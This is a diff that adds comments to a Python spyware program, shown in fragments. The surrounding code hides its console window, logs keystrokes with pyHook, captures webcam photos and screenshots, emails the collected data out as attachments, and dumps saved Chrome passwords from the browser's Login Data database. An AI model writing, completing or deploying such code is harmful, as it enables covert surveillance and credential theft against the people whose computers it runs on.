@@ -51,12 +51,14 @@ passwordConf = 'your_password'
 intervalMail = 360
 
 
+# Hides Window
 def hide():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window, 0)
 hide()
 
 
+# Gets Key if Key is being pressed
 def keydown(event):
     global data
     if event.Ascii == 13:
@@ -99,6 +101,7 @@ def keydown(event):
             fp.write(data)
             fp.close()
 
+# Starts Keylogging part and manages it
 def keylogger():
     obj = pyHook.HookManager()
     obj.KeyDown = keydown
@@ -107,6 +110,7 @@ def keylogger():
     pythoncom.PumpMessages()
 
 
+# Takes Photo through webcam
 def webcam_pic(interval_w):
     cam = Device()
     while True:
@@ -115,6 +119,7 @@ def webcam_pic(interval_w):
         files.append(pic)
 
 
+# Makes screenshot
 def screenshot(interval_scr):
     while True:
         time.sleep(interval_scr)
@@ -124,6 +129,7 @@ def screenshot(interval_scr):
         ImageGrab.grab().save(scr, "PNG")
 
 
+# Sends Mail with all the data as attachments
 def send_mail(From, To, password, intervalM):
 
     while True:
@@ -197,7 +203,7 @@ Output:
 
 """
 
-
+# Dumps all Chrome passwords
 def dump_chrome_passwords():
 
     conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
@@ -215,6 +221,7 @@ def dump_chrome_passwords():
                 f.close()
 
 
+# Creates threads for all the seperate processes
 def create_workers():
     for _ in range(NUMBER_OF_THREADS):
         t = Thread(target=work)
@@ -222,6 +229,7 @@ def create_workers():
         t.start()
 
 
+# Basicly 'assigns' workers to threads
 def work():
 
     x = queue.get()
